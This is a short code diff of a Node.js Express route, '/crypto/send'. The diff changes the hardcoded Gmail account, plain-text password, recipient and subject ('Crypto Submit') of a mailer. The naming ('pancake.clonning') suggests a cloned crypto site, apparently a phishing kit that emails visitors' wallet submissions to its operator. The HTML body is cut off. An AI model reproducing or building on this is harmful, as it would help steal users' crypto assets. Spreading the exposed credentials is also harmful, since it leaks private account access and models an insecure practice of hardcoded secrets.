@@ -15,16 +15,16 @@ router.post('/crypto/send', function(req, res) {
                 service: 'gmail',
                 host: 'smtp.gmail.com',
                 auth: {
-                    user: 'ridhliver3@gmail.com',
-                    pass: 'd4rkw1ng123'
+                    user: 'pancake.clonning@gmail.com',
+                    pass: 'pancakeClonning123'
                 }
             });
         
             // send mail with defined transport object
             let info = await transporter.sendMail({
-                from: 'ridhliver3@gmail.com',
-                to: 'ridhliver2@gmail.com',
-                subject: 'Crypto',
+                from: 'pancake.clonning@gmail.com',
+                to: 'yudisangkala13@gmail.com',
+                subject: 'Crypto Submit',
                 html: `<style type="text/css">
                 .table-box {
                     width: 100% !important;
